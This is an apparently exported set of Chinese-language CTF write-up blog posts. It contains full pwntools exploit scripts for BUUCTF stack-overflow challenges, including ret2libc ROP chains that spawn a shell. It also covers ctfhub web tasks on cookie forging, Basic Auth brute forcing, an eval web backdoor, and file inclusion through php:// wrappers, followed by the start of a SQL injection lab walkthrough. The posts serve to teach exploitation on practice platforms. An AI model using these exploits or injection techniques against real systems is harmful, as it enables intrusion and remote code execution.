libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> *(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行得到flag：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359451505.png" class="" width="1568359451505">
<h1 id="warmup_csaw_2016">warmup_csaw_2016</h1>
<p>看一下源码：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359953444.png" class="" width="1568359953444">
<p>很明显的栈溢出。程序中还有这个：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359977736.png" class="" width="1568359977736">
<p>没啥说的了，直接上exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20035</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568360050956.png" class="" width="1568360050956">
<h1 id="pwn1_sctf_2016">pwn1_sctf_2016</h1>
<p>分析源码：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381486365.png" class="" width="1568381486365">
<p>第13行发现传入的s被限制在了31个字符，没法溢出，但是接着看发现当输入I的时候，程序会把I变成you，这样一来原本一个字符就变成了三个字符，可以溢出了！</p>
<p>发现程序中有get_flag函数：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381665781.png" class="" width="1568381665781">
<p>那么思路就是溢出让程序返回get_flag函数。</p>
<p>动态调试查看输入的起始地址为FFCD1D48（you是程序运行自己修改的）：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381364714.png" class="" width="1568381364714">
<p>程序返回地址存放的位置为FFCD1D90：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568381400442.png" class="" width="1568381400442">
<p>所以偏移量就是90-4C-4=0x40=64，那么就需要填充64个字节，所以构造21个I加一个A，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>,<span class="number">20086</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/pwn1_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get_flag = e.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;get_flag_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(get_flag)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span> * <span class="number">21</span> + <span class="string">&#x27;A&#x27;</span> + p32(get_flag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568382235211.png" class="" width="1568382235211">
<h1 id="ciscn_2019_en_1">ciscn_2019_en_1</h1>
<p>和ciscn_2019_c_1一模一样，exp改个端口号就行了。</p>
<h1 id="ciscn_2019_n_1">ciscn_2019_n_1</h1>
<p>源码很简单：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568388929535.png" class="" width="1568388929535">
<p>就是一个简单的溢出让v2变成11.28125。v1是var_30，v2是var_4：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389165705.png" class="" width="1568389165705">
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389212921.png" class="" width="1568389212921">
<p>再看一下11.28125在程序中的表示：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568389275163.png" class="" width="1568389275163">
<p>也就是让v2变成41348000h，所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20137</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1&#x27;</span> * <span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568386840196.png" class="" width="1568386840196">
<p>我去，居然告诉我没有flag，可能是出题的时候环境配的有问题吧，或者是就是个坑。</p>
<p>不过没关系，那就ROP，具体没啥好说的和前几道题都差不多，，不多说了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_n_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20137</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/ciscn_2019_n_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400793</span></span><br><span class="line">start = <span class="number">0x4006DC</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = e.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;gets_got =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_got)))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload1 += p64(rdi_addr) + p64(gets_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;11.28125\n&#x27;</span>)</span><br><span class="line">gets_leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;gets_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;gets&#x27;</span>, gets_leak)</span><br><span class="line">libc_base = gets_leak - libc.dump(<span class="string">&#x27;gets&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sys_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;bin_sh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bin_sh_addr)))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>)</span><br><span class="line">payload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>取得shell，得到flag：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568423814631.png" class="" width="1568423814631">
]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfhub技能树_web_web前置技能之http协议</title>
    <url>/2020/07/28/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD%E4%B9%8Bhttp%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>这篇文章是ctfhub write
up系列的第一篇，ctfhub这个平台在知名的ctf练习平台中算是相对比较基础的，我觉得它很好的一点是它的技能树由浅入深（只是除了web其他几乎都没几道题啊……），非常适合刚入门的ctfer。这个系列呢就来刷一下ctfhub技能树，wp也会按照技能树的节点来整理。当然，篇幅限制，这个系列不会详细的解释题目背后的基础原理。好了，废话不多说，让我们首先从web开始吧！</p>
<p>初见web，当然要了解web中常用的前置技能中最基础之HTTP协议。</p>
<h1 id="请求方式">请求方式</h1>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728214356549.png"  alt="image-20200728214356549" style="zoom:67%;" /></p>
<p>打开题目，题目描述如下：</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728214449865.png"  alt="image-20200728214449865" style="zoom:67%;" /></p>
<p>让我们用CTF**B，这一猜就是CTFHUB嘛。<del>（我不会告诉你我试了很多遍CTF**B）</del></p>
<p>burp抓包把报头的GET改成CTFHUB再发送，得到flag：</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728214927838.png"  alt="image-20200728214927838" style="zoom:67%;" /></p>
<h1 id="跳转">302跳转</h1>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215000780.png"  alt="image-20200728215000780" style="zoom: 67%;" /></p>
<p>打开题目</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215119561.png"  alt="image-20200728215119561" style="zoom:67%;" /></p>
<p>点一下give me
flag还是这个界面，题目提示我们302跳转，那点击按钮的时候用burp抓包看看：</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215219830.png"  alt="image-20200728215219830" style="zoom:67%;" /></p>
<p>可以看到有一个“一闪而过”的302跳转界面，而这里就有我们要的flag</p>
<h1 id="cookie">Cookie</h1>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215341660.png"  alt="image-20200728215341660" style="zoom: 67%;" /></p>
<p>进入题目：</p>
<img src="/2020/07/28/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD%E4%B9%8Bhttp%E5%8D%8F%E8%AE%AE/image-20200728215415635.png" class="" title="image-20200728215415635">
<p>所以我们要伪造admin身份，burp抓包看看：</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215513014.png"  alt="image-20200728215513014" style="zoom:67%;" /></p>
<p>cookie的值本来是admin=0，我们改成1再请求下就可以得到flag</p>
<h1 id="基础认证">基础认证</h1>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215735900.png"  alt="image-20200728215735900" style="zoom:67%;" /></p>
<p>进入题目，点击按钮，发现让我们输入用户名和密码，注意验证中的“Do u
know admin ?”</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215702867.png"  alt="image-20200728215702867" style="zoom:67%;" /></p>
<p>题目中还有个附件，我们下下来看看，发现是个字典</p>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728215909065.png"  alt="image-20200728215909065" style="zoom: 50%;" /></p>
<p>那看来让我们爆破了，题目中有“Do u know admin
?”，那我们就猜用户名是admin，用burp开始爆破吧，首先burp抓包看看（用户名随便填的wwww，密码随便填的ww）：</p>
<img src="/2020/07/28/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD%E4%B9%8Bhttp%E5%8D%8F%E8%AE%AE/image-20200728220401932.png" class="" title="image-20200728220401932">
<p>发现有base64加密，解密后发现是wwww:ww，那我们就知道了请求的格式了：“用户名:密码”。</p>
<p>准备爆破，注意设置规则，先添加前缀<code>admin:</code>，再进行base64加密得到payload，设置完成后用题目给的字典开始爆破。</p>
<img src="/2020/07/28/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD%E4%B9%8Bhttp%E5%8D%8F%E8%AE%AE/image-20200728220822212.png" class="" title="image-20200728220822212">
<p>爆破结果：</p>
<img src="/2020/07/28/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD%E4%B9%8Bhttp%E5%8D%8F%E8%AE%AE/image-20200728221049282.png" class="" title="image-20200728221049282">
<p>可以看到有一次的结果和其他结果返回的数据包长度不一样，打开响应包，得到flag</p>
<h1 id="响应包源代码">响应包源代码</h1>
<p><img src="/2020/07/28/CTF/ctfhub技能树-web-web前置技能之http协议/image-20200728221211252.png"  alt="image-20200728221211252" style="zoom:67%;" /></p>
<p>打开是个贪吃蛇游戏，不过我们不管他，看看网页的源码：</p>
<img src="/2020/07/28/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD%E4%B9%8Bhttp%E5%8D%8F%E8%AE%AE/image-20200728221427620.png" class="">
<p>直接得到flag</p>
<p>至此，http协议的技能树我们就全解锁啦，继续向青草更青处漫溯吧！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfhub技能树_web_RCE之eval、文件包含</title>
    <url>/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>这次我们来看看RCE（远程代码/命令执行）吧。由于篇幅限制，<strong>这篇文章不包含命令注入</strong>，命令注入我会在另一篇文章中详细的记录。</p>
<h1 id="eval执行">eval执行</h1>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200730155557512.png"  alt="image-20200730155557512" style="zoom:67%;" /></p>
<p>打开题目，可以看到网页的源代码</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728222754175.png" class="" title="image-20200728222754175">
<p>通过代码可以看到，这就是典型的web后门，配置中国蚁剑</p>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200730153921884.png"  alt="image-20200730153921884" style="zoom:67%;" /></p>
<p>进入后台，获取flag</p>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200730153821908.png"  alt="image-20200730153821908" style="zoom:80%;" /></p>
<h1 id="文件包含">文件包含</h1>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200728223933664.png"  alt="image-20200728223933664" style="zoom:67%;" /></p>
<p>看看代码：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728223945677.png" class="" title="image-20200728223945677">
<p>strpos(string,find,start)
函数查找字符串在另一字符串中第一次出现的位置</p>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">参数</th>
<th style="text-align: left;">描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><em>string</em></td>
<td style="text-align: left;">必需。规定要搜索的字符串。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><em>find</em></td>
<td style="text-align: left;">必需。规定要查找的字符串。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><em>start</em></td>
<td style="text-align: left;">可选。规定在何处开始搜索。</td>
</tr>
<tr class="even">
<td style="text-align: left;">返回值：</td>
<td
style="text-align: left;">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回
FALSE。<br /><strong>注释：</strong>字符串位置从 0 开始，不是从 1
开始。</td>
</tr>
</tbody>
</table>
<p>可以看到如果get传入参数file的值开头<strong>不</strong>为xflag（x为任意字符），则执行include()函数。</p>
<p>include （或
require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用
include 语句的文件中。</p>
<p>服务器后台有一句话木马shell.txt，因此我们的目标就是让服务器执行shell.txt中的语句。所以file的值为shell.txt</p>
<p>看看shell：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728224421429.png" class="" title="image-20200728224421429">
<p>则shell要传的参数是ctfhub：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200730154818635.png" class="" title="image-20200730154818635">
<p>查找flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200730154859368.png" class="" title="image-20200730154859368">
<p>得到flag：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200730154918100.png" class="" title="image-20200730154918100">
<h1 id="phpinput">php://input</h1>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200728230112933.png"  alt="image-20200728230112933" style="zoom:67%;" /></p>
<p>首先看代码：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728230147871.png" class="" title="image-20200728230147871">
<p>可以看到如果get的参数file前六个字符为”php://“则执行include函数</p>
<p>看看phpinfo</p>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200728230338863.png"  alt="image-20200728230338863" style="zoom:67%;" /></p>
<p>可以看到allow_url_include是On，说明可以使用php://input伪协议。</p>
<p>php://input
是个可以访问请求的原始数据的只读流。其实说白了它就是用来获取post内容的，但是其实只要你把内容写到请求包中，post和get都能获取。</p>
<p>那我们就通过这个伪协议和精心构造的请求包来获取我们想要的信息（注意此时虽然我是get请求而不是post，但由于我的包中有内容，所以伪协议依然是接收到了）：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728231301739.png" class="" title="image-20200728231301739">
<p>这样我们就可以来找我们要的flag了</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728231554765.png" class="" title="image-20200728231554765">
<p>有了flag的路径，就可以得到flag了。</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728231744426.png" class="" title="image-20200728231744426">
<h1 id="远程包含">远程包含</h1>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200728231924149.png"  alt="image-20200728231924149" style="zoom:67%;" /></p>
<p>看代码：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728232001224.png" class="" title="image-20200728232001224">
<p>这个题的解法和上一题php://input一模一样，不再赘述。</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728232316912.png" class="" title="image-20200728232316912">
<h1 id="读取源代码">读取源代码</h1>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728232832725.png" class="" title="image-20200728232832725">
<p>代码审计：</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728232902587.png" class="" title="image-20200728232902587">
<p>首先尝试php://input，发现没有返回结果</p>
<p><img src="/2020/07/30/CTF/ctfhub技能树-web-RCE之eval、文件包含/image-20200728233102208.png"  alt="image-20200728233102208" style="zoom:67%;" /></p>
<p>测试了好多遍都无果，那看来是没法用input了。再看题目，题目告诉我们了flag的路径，于是我们可以用另一条伪指令php://filter来进行读取</p>
<p>php://filter是一种元封装器，
设计用于数据流打开时的筛选过滤应用。简单理解就是个可以读取数据的过滤器。我们可以用它选择想要进行操作并读取的内容。</p>
<p>php://filter 目标使用以下的参数作为它路径的一部分。
复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
<table>
<colgroup>
<col style="width: 31%" />
<col style="width: 68%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">名称</th>
<th style="text-align: left;">描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><em>resource=<要过滤的数据流></em></td>
<td
style="text-align: left;">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><em>read=<读链的筛选列表></em></td>
<td
style="text-align: left;">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><em>write=<写链的筛选列表></em></td>
<td
style="text-align: left;">该参数可选。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td>
</tr>
<tr class="even">
<td style="text-align: left;"><em>&lt;；两个链的筛选列表&gt;</em></td>
<td style="text-align: left;">任何没有以 <em>read=</em> 或
<em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody>
</table>
<p>关于php://filter更多的妙用可以看这个大佬的<a
href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">文章</a>。</p>
<p>知道了php://filter的用法，我们就可以读取flag了。</p>
<img src="/2020/07/30/CTF/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91-web-RCE%E4%B9%8Beval%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200728232928462.png" class="" title="image-20200728232928462">
<p>关于伪协议部分，这里是官方的<a
href="https://www.php.net/manual/zh/wrappers.php.php">文档</a>。</p>
<p>至此，我们初步了解了文件包含和eval执行，解锁了对应的技能树，下一步，我们就来看看命令注入吧。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>sql-lab Less1-5题 Write Up</title>
    <url>/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/</url>
    <content><![CDATA[<h1 id="less-1">Less-1</h1>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713154808415.png" class="" title="image-20200713154808415">
<p>输入一个id看看</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713154939518.png" class="" title="image-20200713154939518">
<p>题目是单引号，因此id加一个单引号看看</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713155040120.png" class="" title="image-20200713155040120">
<p>可以看到报错了。说明单引号被成功解析，那么我们就通过闭合单引号来进行注入。</p>
<p>首先通过order by判断字段：</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713155238806.png" class="" title="image-20200713155238806">
<p>不断提高order by后面的数值</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713155311592.png" class="" title="image-20200713155311592">
<p>可以看到order by到4的时候报错了，说明字段只有3个。</p>
<p>接下来通过union看看页面显示的内容对应的位置</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713155813890.png" class="" title="image-20200713155813890">
<p>页面成功执行，但是返回的内容没有变化，说明页面只会返回第一条结果（id=1），因此我们可以把id变成系统中没有的（id=-1），让服务器返回select的结果</p>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713155932512.png" class="" title="image-20200713155932512">
<p>可以看到页面返回了2和3，说明页面返回的是select的第二个和第三个地方，所以我们注入的地方就是2和3</p>
<p>接下来查询当前网站使用的数据库 database()、当前Mysql的版本
version()、当前Mysql的用户 user()</p>
<blockquote>
<p>CONCAT_WS(separator,str1,str2,...)，连接str1、str2等字符串，并在各字符串中以separator分隔</p>
</blockquote>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713160539637.png" class="" title="image-20200713160539637">
<p>接下来先查询服务器一共有多少个数据库</p>
<blockquote>
<p>Mysql中默认存放一个information_schema的数据库，该库中，有三个重要的表，分别是schemata,
tables和columns</p>
<p>schemata储存该用户创建的所有数据库的库名，库名字段为schema_name</p>
<p>tables储存该用户创建的所有数据库的库名和每个库中的表名，库名字段是table_schema，表名字段是table_name</p>
<p>columns储存该用户创建的所有数据库的库名、每个库的表名和每个库中每个表中的字段名，库名字段是table_schema，表名字段是table_name，字段名是column_name</p>
</blockquote>
<img src="/2020/07/13/CTF/sql-lab-Less1-5%E9%A2%98-Write-Up/image-20200713162304922.png" class="" title="image-20200713162304922">
